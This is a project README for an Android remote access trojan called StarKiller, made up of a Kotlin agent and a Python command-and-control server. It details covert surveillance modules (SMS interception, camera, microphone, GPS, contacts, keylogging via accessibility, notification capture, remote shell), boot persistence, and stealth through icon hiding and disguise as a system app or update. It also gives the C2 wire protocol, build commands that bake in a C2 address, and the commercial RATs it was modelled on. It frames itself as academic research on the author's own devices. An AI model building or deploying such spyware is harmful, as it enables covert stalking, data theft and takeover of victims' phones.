# STARKILLER

```
 ███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ███████╗   ██║   ███████║██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ╚════██║   ██║   ██╔══██║██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ███████║   ██║   ██║  ██║██║  ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
```

**22DIV // george wu // Android Remote Access**

> *"The dark side is a pathway to many abilities some consider to be... unnatural."*

---

### What This Is

Android RAT built from first principles. Kotlin client, Python C2 server, web dashboard.
Speaks VADER agent protocol (length-prefixed JSON over TCP) — cross-compatible with
vader_ui.py and vader_agent.py.

Own hardware only. CSEC security research. Private repo.

### Classification

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
AUTHORISATION:   CSEC academic research, own devices
TARGET:          Own Android devices ONLY
```

### Architecture

```
StarKiller/
├── server/
│   └── starkiller_c2.py    C2 server — web dashboard + agent listener
├── client/                  Android Kotlin project
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── kotlin/com/starkiller/agent/
│   │   │   │   ├── StarKillerService.kt     Background service
│   │   │   │   ├── C2Client.kt              VADER protocol client
│   │   │   │   ├── TaskRouter.kt            Task dispatch
│   │   │   │   └── modules/
│   │   │   │       ├── DeviceInfo.kt        Hardware + OS info
│   │   │   │       ├── CameraCapture.kt     Front/rear camera
│   │   │   │       ├── SmsModule.kt         SMS read/intercept
│   │   │   │       ├── GpsTracker.kt        Location tracking
│   │   │   │       ├── ContactsDump.kt      Contacts export
│   │   │   │       ├── FileManager.kt       File browser + transfer
│   │   │   │       ├── MicRecorder.kt       Ambient audio recording
│   │   │   │       ├── ScreenCapture.kt     Screenshot
│   │   │   │       ├── KeyLogger.kt         Accessibility service
│   │   │   │       ├── CallLog.kt           Call history
│   │   │   │       ├── AppList.kt           Installed apps
│   │   │   │       └── NotifListener.kt     Notification capture
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle.kts
│   ├── build.gradle.kts
│   └── settings.gradle.kts
├── payloads/                Built APKs (gitignored)
├── docs/                    Documentation
├── setup.py                 Automated SDK + build environment setup
├── build.py                 Build APK with baked C2 config
└── README.md
```

### Protocol

Same as VADER agent protocol — StarKiller APK is a mobile vader_agent:

```
Wire format: [4-byte big-endian length][UTF-8 JSON payload]

Agent → C2:
  {"type": "register", "agent_id": "...", "hostname": "...", "platform": "android", ...}
  {"type": "heartbeat"}
  {"type": "output", "task_id": "...", "line": "..."}
  {"type": "result", "task_id": "...", "status": "ok", "data": {...}}
  {"type": "file_data", "task_id": "...", "data": "<base64>"}

C2 → Agent:
  {"type": "task", "id": "...", "op": "sysinfo|camera|sms|gps|contacts|files|mic|screen|exec|..."}
```

### Features

| Module | Op Code | Description |
|--------|---------|-------------|
| Device Info | `sysinfo` | IMEI, model, OS, carrier, battery, network |
| Camera | `camera` | Front/rear photo capture |
| SMS | `sms_read` | Read SMS inbox |
| SMS | `sms_send` | Send SMS from device |
| GPS | `gps` | Real-time location |
| Contacts | `contacts` | Dump all contacts |
| Files | `ls` | Directory listing |
| Files | `download` | Download file from device |
| Files | `upload` | Upload file to device |
| Microphone | `mic` | Record ambient audio |
| Screen | `screenshot` | Capture screen |
| Keylogger | `keylog` | Accessibility-based keystroke capture |
| Call Log | `calllog` | Call history |
| App List | `apps` | Installed applications |
| Notifications | `notifs` | Capture notifications |
| Shell | `exec` | Execute shell command |
| Persistence | — | Boot receiver + foreground service |
| Stealth | — | Hide app icon, disguise as system app |

### Persistence

- `RECEIVE_BOOT_COMPLETED` — start on device boot
- Foreground service with persistent notification (disguised as system update)
- `START_STICKY` — OS restarts service if killed
- `WakeLock` — prevent CPU sleep during operations
- Auto-reconnect with exponential backoff

### Build

```bash
# First time — install Android SDK + Gradle
python setup.py

# Build APK with your C2 IP baked in
python build.py --ip 192.168.1.96 --port 8667

# Build + sign + install to connected device
python build.py --ip 192.168.1.96 --port 8667 --install
```

### Research Sources

Built after studying:
- G700 RAT (CraxsRAT evolution) — C# server, Java APK, APKEditor obfuscation
- EagleSpy v5 — anti-VM, keylogger, GPS, commercial RAT
- L3MON — Node.js + Socket.io server, Smali APK, web dashboard
- Cerberus (leaked source) — fork ecosystem, obfuscation patterns

### Rules of Engagement

1. Own devices only
2. Private repo — never public
3. CSEC academic research context
4. No distribution of built APKs
5. Binaries never committed to repo

---

*Built from VADER's protocol. The agent doesn't care what OS it runs on.*
